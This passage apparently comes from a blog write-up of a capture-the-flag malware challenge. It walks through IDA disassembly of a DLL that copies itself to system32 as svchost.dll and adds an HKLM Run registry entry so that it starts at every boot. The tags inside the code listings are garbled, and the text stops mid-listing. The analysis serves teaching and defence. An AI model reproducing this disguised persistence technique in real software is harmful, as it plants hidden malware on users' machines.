<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Returning from sub<em>1000A570</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6BB</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A570</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6C0</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">110</span><span class="p">],</span> <span class="nb">eax</span>              <span class="c1">; return value stored in var&lt;/em&gt;110</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6C6</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phModule</span><span class="p">],</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6D0</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phModule</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6D6</span> <span class="nv">push</span>    <span class="nb">ecx</span>                             <span class="c1">; phModule</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6D7</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A610</span>             <span class="c1">; lpModuleName</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6DC</span> <span class="nv">push</span>    <span class="mi">6</span>                               <span class="c1">; dwFlags</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6DE</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetModuleHandleExA</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6E4</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6E6</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A711</span>              <span class="c1">; if (eax!=0) jmp loc&lt;em&gt;1000A711</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6E8</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetLastError</span>                 <span class="c1">; if (eax==0) print LastError to file</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6EE</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">120</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6F4</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">120</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6FA</span> <span class="nv">push</span>    <span class="nb">edx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6FB</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aGetmodulehandl</span>          <span class="c1">; “GetModuleHandle returned %d\n”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A700</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">AD77</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A705</span> <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">40h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A708</span> <span class="nv">push</span>    <span class="nb">eax</span>                             <span class="c1">; FILE *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A709</span> <span class="nv">call</span>    <span class="nv">_fprintf</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A70E</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>If <code>GetModuleHandleEx</code> was successful it will land here. <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx">GetModuleFileName</a> is called which will return the full path for the specified module in <code>hModule</code>. In this case, the binary retrieves its own path (line 9) and saves it in <code>[ebp+Filename]</code>. In line 10, return value of <code>sub_1000A570</code> is compared with 2.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Getting Dll path </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A711</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A711</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A711</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A711</span> <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nSize</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A716</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Filename</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A71C</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpFilename</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A71D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phModule</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A723</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; hModule</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A724</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetModuleFileNameA</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A72A</span> <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">110</span><span class="p">],</span> <span class="mi">2</span>           <span class="c1">; comparing return value of sub&lt;em&gt;1000A570 with 2</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A731</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A772</span>         <span class="c1">; if return value is not 2, then jump to loc_1000A772</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>If registry key did not exist, we will continue.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>CopyFile </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A733</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpNewFileName</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">aCWindowsSystem</span> <span class="c1">; “c:\windows\system32\svchost.dll”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A73D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">124</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">aCWindowsSyst</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">; “c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A747</span> <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; bFailIfExists - 0 means overwrite if file already exists</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A749</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpNewFileName</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A74F</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpNewFileName ; “c:\windows\system32\svchost.dll”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A750</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Filename</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A756</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpExistingFileName - Dll name from GetModuleFileName</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A757</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CopyFileA</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A75D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">124</span><span class="p">]</span>   <span class="c1">; From line 2</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A763</span> <span class="nv">push</span>    <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A764</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A610</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A769</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A76C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_114</span><span class="p">],</span> <span class="nb">eax</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We have already seen the strings being loaded in lines 1 and 2. Then <code>CopyFile</code> is called to copy itself to <code>c:\\windows\\system32\\svchost.dll</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>sub_1000A610 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A610</span> <span class="nv">push</span>    <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A611</span> <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A613</span> <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A616</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phkResult</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A619</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; phkResult</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A61A</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aSoftwareMicr</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">; “SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A61F</span> <span class="nv">push</span>    <span class="mh">80000002h</span>       <span class="c1">; hKey   “HKEY_LOCAL_MACHINE”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A624</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">RegCreateKeyA</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A62A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A62D</span> <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A631</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A663</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="c1">; Continue if RegCreateKey was successful</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A633</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpData</span><span class="p">]</span>  <span class="c1">; “c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A636</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; char *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A637</span> <span class="nv">call</span>    <span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="nv">strlen</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A63C</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A63F</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; cbData - strlen(lpData)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A640</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpData</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A643</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpData - ; “c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A644</span> <span class="nv">push</span>    <span class="mi">1</span>               <span class="c1">; dwType</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A646</span> <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; Reserved</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A648</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aSvchost</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">; “svchost”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A64D</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phkResult</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A650</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hKey</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A651</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">RegSetValueExA</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A657</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">],</span> <span class="mi">0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A65E</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A661</span> <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_1000A673</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A673</span> <span class="nv">loc_1000A673</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A673</span> <span class="nv">mov</span>     <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A675</span> <span class="nv">pop</span>     <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A676</span> <span class="nv">retn</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Line 9 pushes <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> to the stack and calls <code>sub_1000A610</code> in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.</p>

<p>Inside this function we see that <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724842%28v=vs.85%29.aspx">RegCreateKey</a> to open <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If the key does not exist, it will create it.</p>

<p>If call was successful, execution continues to line 14. It is adding a new registry key named <code>svchost</code> to that path with the specified value. Then function will return with the result value of RegSetValueEx. If it was successful, it will be 0.</p>

<p><em>The Dll copied itself to system32 and it will run every time Windows starts</em>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Returning from sub_1000A610 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="err">&lt;/</span><span class="nf">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">1000</span><span class="nv">A757</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CopyFileA</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A75D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">124</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A763</span> <span class="nv">push</span>    <span class="nb">ecx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A764</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A610</span>     <span class="c1">; Create registry key</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A769</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A76C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">114</span><span class="p">],</span> <span class="nb">eax</span>   <span class="c1">; Not used anymore</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A772</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A772</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A772</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1000</span><span class="nv">A4C0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A777</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">118</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A77D</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">118</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A783</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A786</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A788</span> <span class="nv">call</span>    <span class="err">@</span><span class="nv">__security_check_cookie@4</span> <span class="c1">; __security_check_cookie(x)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A78D</span> <span class="nv">mov</span>     <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A78F</span> <span class="nv">pop</span>     <span class="nb">ebp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A790</span> <span class="nv">retn</span>    <span class="mh">0Ch</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A790</span> <span class="nv">_DllMain@12</span> <span class="nv">endp</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A790</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>After we return from <code>sub_1000A610</code>, we land in line 5. Return value will be saved in <code>var_114</code> (0 is key was created). If we highlight this variable and press <code>x</code> in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called <code>sub_1000A4C0</code>. Let’s go inside.</p>

<p><img src="/images/2014/flare/5-4.jpg" alt="1000A4C0" title="1000A4C0" /></p>

<p>Inside <code>sub_1000A4C0</code> we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let’s look at the other branch.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>sub_1000A4C0 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
